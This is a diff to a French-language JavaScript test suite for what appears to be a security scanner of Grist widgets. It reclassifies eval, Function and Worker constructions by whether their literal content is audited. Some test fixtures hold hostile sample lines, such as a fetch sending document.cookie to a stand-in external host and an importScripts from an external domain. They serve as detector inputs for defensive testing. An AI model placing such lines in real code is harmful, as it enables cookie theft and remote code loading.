@@ -355,12 +355,17 @@ test('importScripts() avec DEUX arguments externes distincts sur le même appel 
 // worker blob: comme depuis un worker data: (voir la conversation).
 // ---------------------------------------------------------------------------
 
-test('C-XSS-07 : new Worker(URL.createObjectURL(new Blob([littéral]))) est critique et bloquant', () => {
+test("C-XSS-07 : new Worker(URL.createObjectURL(new Blob([littéral]))) est un littéral entièrement lisible — audité comme le reste du dépôt, pas critique pour sa seule construction", () => {
   const ctx = { fichiers: [fichier('app.js', "const w = new Worker(URL.createObjectURL(new Blob([\"importScripts('https://exemple.tiers/x.js')\"])));")] };
-  const c = analyserInjections(ctx).find((x) => x.regle === 'C-XSS-07');
-  assert.ok(c, "le code du worker est une chaîne écrite dans le dépôt, jamais lue par aucune règle basée sur les fichiers");
-  assert.equal(c.severite, 'critique');
-  assert.equal(c.bloquant, true);
+  const constats = analyserInjections(ctx);
+  const construction = constats.find((x) => x.regle === 'C-XSS-07');
+  assert.ok(construction, "le code du worker est lisible : la construction elle-même n'est plus qu'un rappel de lisibilité");
+  assert.equal(construction.severite, 'mineur');
+  assert.equal(construction.bloquant, false);
+  const importScriptsExterne = constats.find((x) => x.regle === 'C-EXFIL-01' && x.titre.includes('Code littéral audité'));
+  assert.ok(importScriptsExterne, "le VRAI risque (importScripts vers un domaine externe) doit être vu par l'analyse imbriquée, pas seulement la construction");
+  assert.equal(importScriptsExterne.severite, 'critique');
+  assert.equal(importScriptsExterne.bloquant, true);
 });
 
 test("C-XSS-07 : new SharedWorker(URL.createObjectURL(new Blob([littéral]))) est également détecté", () => {
@@ -369,12 +374,17 @@ test("C-XSS-07 : new SharedWorker(URL.createObjectURL(new Blob([littéral]))) es
   assert.ok(c);
 });
 
-test('C-XSS-07 : new Worker(url data: littérale) est critique et bloquant', () => {
+test("C-XSS-07 : new Worker(url data: littérale) est décodée et auditée — le VRAI risque (importScripts externe) ressort en critique, pas la construction", () => {
   const ctx = { fichiers: [fichier('app.js', "const w = new Worker('data:text/javascript,importScripts(%27https://exemple.tiers/x.js%27)');")] };
-  const c = analyserInjections(ctx).find((x) => x.regle === 'C-XSS-07');
-  assert.ok(c);
-  assert.equal(c.severite, 'critique');
-  assert.equal(c.bloquant, true);
+  const constats = analyserInjections(ctx);
+  const construction = constats.find((x) => x.regle === 'C-XSS-07');
+  assert.ok(construction);
+  assert.equal(construction.severite, 'mineur');
+  assert.equal(construction.bloquant, false);
+  const importScriptsExterne = constats.find((x) => x.regle === 'C-EXFIL-01' && x.titre.includes('Code littéral audité'));
+  assert.ok(importScriptsExterne, "le data: doit être décodé (URI-encodage) puis analysé comme du code");
+  assert.equal(importScriptsExterne.severite, 'critique');
+  assert.equal(importScriptsExterne.bloquant, true);
 });
 
 test("C-XSS-07 : un Blob construit depuis une VARIABLE (contenu reçu du réseau, ou autre) est signalé quand même — accuser la construction, pas le contenu (la coordination a montré que 'seulement si littéral' se contournait en une ligne)", () => {
@@ -456,12 +466,16 @@ test("C-XSS-07 : new Worker(url) où url = URL.createObjectURL(blob) est assign�
 // C-EXFIL-05) que la coordination avait signalés comme non vérifiés.
 // ---------------------------------------------------------------------------
 
-test("C-XSS-07 : new window.Worker(...) (alias global) est détecté comme new Worker(...)", () => {
-  const ctx = { fichiers: [fichier('app.js', "const w = new window.Worker(URL.createObjectURL(new Blob(['x'])));")] };
-  const c = analyserInjections(ctx).find((x) => x.regle === 'C-XSS-07');
+test("C-XSS-07 : new window.Worker(...) (alias global) est détecté comme new Worker(...), et son contenu littéral tout autant audité", () => {
+  const ctx = { fichiers: [fichier('app.js', "const w = new window.Worker(URL.createObjectURL(new Blob([\"importScripts('https://exemple.tiers/x.js')\"])));")] };
+  const constats = analyserInjections(ctx);
+  const c = constats.find((x) => x.regle === 'C-XSS-07');
   assert.ok(c);
-  assert.equal(c.severite, 'critique');
+  assert.equal(c.severite, 'mineur');
   assert.equal(c.titre.startsWith('Worker '), true, "l'alias ne doit pas fuiter dans le texte affiché (plus de \"undefined construit depuis...\")");
+  const importScriptsExterne = constats.find((x) => x.regle === 'C-EXFIL-01' && x.titre.includes('Code littéral audité'));
+  assert.ok(importScriptsExterne, "l'alias ne doit pas empêcher l'analyse du contenu littéral non plus");
+  assert.equal(importScriptsExterne.severite, 'critique');
 });
 
 test("C-XSS-07 : self.URL.createObjectURL(...) (alias global sur URL) est traité comme URL.createObjectURL(...)", () => {
@@ -507,18 +521,46 @@ test("surface exécutée : new Worker(new URL('./w.js', location.href)) (base au
   assert.ok(w?.executee, "w.js doit être dans la surface même si la base n'est pas import.meta.url — c'est le chemin local qui compte, pas la base");
 });
 
-test("C-XSS-03 : Function(...) sans new est traité comme new Function(...)", () => {
+test("C-XSS-03 : Function(...) sans new est reconnu comme new Function(...), et son contenu littéral audité (pas critique pour la seule construction)", () => {
   const ctx = { fichiers: [fichier('app.js', "const f = Function('return document.cookie');")] };
   const c = analyserInjections(ctx).find((x) => x.regle === 'C-XSS-03' && x.titre.includes('sans new'));
   assert.ok(c, 'Function(str) sans new compile aussi une chaîne en fonction exécutable');
+  assert.equal(c.severite, 'mineur', "un simple retour de document.cookie, sans l'envoyer nulle part, n'a pas la propriété de sécurité qui justifie critique+bloquant (voir Function(\"return this\") dans lodash, widget-exemple)");
+  assert.equal(c.bloquant, false);
+});
+
+test("C-XSS-03 : Function(...) sans new reste critique quand son corps littéral exfiltre réellement (fetch vers un domaine externe)", () => {
+  const ctx = { fichiers: [fichier('app.js', 'const f = Function(\'fetch("https://exemple.tiers/vole?c="+document.cookie)\');')] };
+  const constats = analyserInjections(ctx);
+  const construction = constats.find((x) => x.regle === 'C-XSS-03' && x.titre.includes('sans new'));
+  assert.equal(construction.severite, 'mineur', "la construction elle-même n'est qu'un rappel de lisibilité : le risque réel doit être ailleurs");
+  const fetchExterne = constats.find((x) => x.regle === 'C-EXFIL-02' && x.titre.includes('Code littéral audité'));
+  assert.ok(fetchExterne, "le fetch() imbriqué dans le corps littéral doit être vu par l'analyse imbriquée (C-EXFIL-02 : destination calculée par concaténation)");
+});
+
+test("C-XSS-03 : Function(...) sans new reste critique et bloquant quand son argument est calculé (rien à auditer)", () => {
+  const ctx = { fichiers: [fichier('app.js', 'const f = Function(corpsCalcule);')] };
+  const c = analyserInjections(ctx).find((x) => x.regle === 'C-XSS-03' && x.titre.includes('sans new'));
   assert.equal(c.severite, 'critique');
   assert.equal(c.bloquant, true);
 });
 
-test("C-XSS-03 : eval indirect (0, eval)(...) est traité comme eval(...)", () => {
-  const ctx = { fichiers: [fichier('app.js', "(0, eval)('document.cookie');")] };
+test("C-XSS-03 : eval indirect (0, eval)(...) est reconnu comme eval(...), et son contenu littéral audité — un eval imbriqué y redevient critique", () => {
+  const ctx = { fichiers: [fichier('app.js', "(0, eval)('eval(codeCalcule)');")] };
+  const constats = analyserInjections(ctx);
+  const construction = constats.find((x) => x.regle === 'C-XSS-03' && x.titre.includes('indirect'));
+  assert.ok(construction, "l'eval indirect via l'opérateur virgule est un contournement courant des recherches sur eval(");
+  assert.equal(construction.severite, 'mineur');
+  assert.equal(construction.bloquant, false);
+  const evalImbrique = constats.find((x) => x.regle === 'C-XSS-03' && x.titre.includes('Code littéral audité') && x.titre.includes('eval()') && !x.titre.includes('indirect'));
+  assert.ok(evalImbrique, "l'eval() imbriqué dans le littéral, lui-même à argument calculé, doit redevenir critique");
+  assert.equal(evalImbrique.severite, 'critique');
+  assert.equal(evalImbrique.bloquant, true);
+});
+
+test("C-XSS-03 : eval indirect (0, eval)(...) reste critique et bloquant quand son argument est calculé", () => {
+  const ctx = { fichiers: [fichier('app.js', "(0, eval)(codeCalcule);")] };
   const c = analyserInjections(ctx).find((x) => x.regle === 'C-XSS-03' && x.titre.includes('indirect'));
-  assert.ok(c, "l'eval indirect via l'opérateur virgule est un contournement courant des recherches sur eval(");
   assert.equal(c.severite, 'critique');
   assert.equal(c.bloquant, true);
 });
@@ -601,4 +643,29 @@ test("C-EXFIL-05 : un <link> local ou Grist ne déclenche rien", () => {
     "l.href = '/style.css';",
   ].join('\n'))] };
   assert.equal(analyserScriptDynamique(ctx).filter((x) => x.regle === 'C-EXFIL-05').length, 0);
+});
+
+// ---------------------------------------------------------------------------
+// Cas concret qui a motivé la distinction littéral/calculé : Function("return
+// this") est l'idiome lodash (bundlé par l'API Grist elle-même, node_modules/
+// lodash/_root.js) pour obtenir l'objet global, prédatant globalThis — une
+// chaîne figée, lisible, qui ne touche ni donnée ni réseau. Le classer
+// critique+bloquant faisait passer widget-exemple (qui embarque l'API Grist,
+// suivant le conseil de C-EXFIL-04) de CONFORME à NON CONFORME pour un idiome
+// sans rapport avec une vraie faille.
+// ---------------------------------------------------------------------------
+
+test('C-XSS-03 : Function("return this") (idiome lodash de détection du global) ne produit qu\'un rappel mineur, jamais bloquant', () => {
+  const contenu = [
+    'var freeGlobal = typeof global == "object" && global && global.Object === Object && global;',
+    'var freeSelf = typeof self == "object" && self && self.Object === Object && self;',
+    'var root = freeGlobal || freeSelf || Function("return this")();',
+  ].join('\n');
+  const ctx = { fichiers: [fichier('grist-plugin-api.js', contenu)] };
+  const constats = analyserInjections(ctx);
+  const c = constats.find((x) => x.regle === 'C-XSS-03');
+  assert.ok(c);
+  assert.equal(c.severite, 'mineur');
+  assert.equal(c.bloquant, false);
+  assert.equal(constats.some((x) => x.bloquant), false, "aucun constat bloquant : ce fichier ne doit plus, à lui seul, faire échouer la conformité");
 });
